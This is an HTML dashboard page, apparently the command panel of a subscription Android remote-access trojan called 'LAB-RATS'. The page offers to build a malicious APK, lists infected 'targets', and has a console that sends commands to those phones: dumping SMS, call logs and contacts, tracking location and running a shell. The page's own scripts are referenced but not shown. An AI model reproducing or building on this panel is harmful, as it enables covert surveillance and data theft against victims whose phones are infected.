<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Dashboard</title><link rel="stylesheet" href="css/style.css"><script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js"></script><script src="js/firebase-config.js"></script></head>
<body>
<header class="dashboard-header">
  <div class="logo">◆ LAB-RATS</div>
  <div style="display:flex; align-items:center; gap:1.5rem;">
    <a href="#" id="dev-link" class="hidden" style="color:#f85149; font-weight:bold; border:1px solid #f85149; padding:0.4rem 1rem; border-radius:8px;">🛡️ DEV PANEL</a>
    <button id="btn-build" class="btn" style="width:auto; padding:0.4rem 1rem; background:#58a6ff; color:#0a0c10; font-weight:bold;" onclick="buildAPK(event)">⚡ Build APK</button>
    <a href="upgrade.html" style="color:#3fb950; font-weight:600;">Upgrade</a>
    <div class="profile-section"><div class="avatar" id="avatar-init">A</div><div><div style="font-size:0.9rem;" id="user-email">Loading...</div><div style="font-size:0.75rem; color:#8b949e;" id="user-role">Basic</div><div style="font-size:0.75rem; color:#f85149;" id="user-expired"></div></div></div>
    <button class="btn btn-outline" style="width:auto; padding:0.4rem 1rem;" onclick="firebase.auth().signOut().then(()=>window.location.href='login.html')">Logout</button>
  </div>
</header>
<main class="main-content">
  <div id="banned-screen" class="hidden" style="text-align:center; padding: 5rem 2rem;"><h1 style="color:#f85149; font-size:3rem;">🚫 ACCOUNT BANNED</h1></div>
  <div id="dashboard-content">
    <div style="display:flex; justify-content:space-between; align-items:center;"><h2>My Targets</h2><div style="display:flex; gap:1rem;"><span class="role-badge">Online: <span id="online-count">0</span></span><span class="role-badge" style="background:#21262d; color:#c9d1d9;">Total: <span id="total-count">0</span></span></div></div>
    <div id="device-list" class="device-grid"><p style="color:#8b949e;">Belum ada target.</p></div>
    <div id="console-panel" class="panel hidden"><div style="display:flex; justify-content:space-between; margin-bottom:1rem;"><h3 id="console-title">Console</h3><button class="btn btn-outline" style="width:auto; padding:0.2rem 0.8rem;" onclick="document.getElementById('console-panel').classList.add('hidden')">Tutup</button></div><div style="display:flex; gap:0.5rem; margin-bottom:1rem;"><select id="cmd-action" style="flex:1; padding:0.6rem; background:#161b22; color:#fff; border:1px solid #30363d; border-radius:6px;"><option value="sms_dump">SMS Dump</option><option value="call_log_dump">Call Log</option><option value="contacts_dump">Contacts</option><option value="location">Location</option><option value="shell">Shell</option></select><input type="text" id="cmd-args" placeholder="Args" style="flex:2; padding:0.6rem; background:#161b22; color:#fff; border:1px solid #30363d; border-radius:6px;"><button class="btn" style="width:auto;" onclick="sendCommand()">Send</button></div><pre id="output-box" style="background:#010409; padding:1rem; border-radius:6px; color:#3fb950; min-height:200px; overflow:auto;">Waiting...</pre></div>
  </div>
</main>
<script src="js/panel.js"></script></body></html>
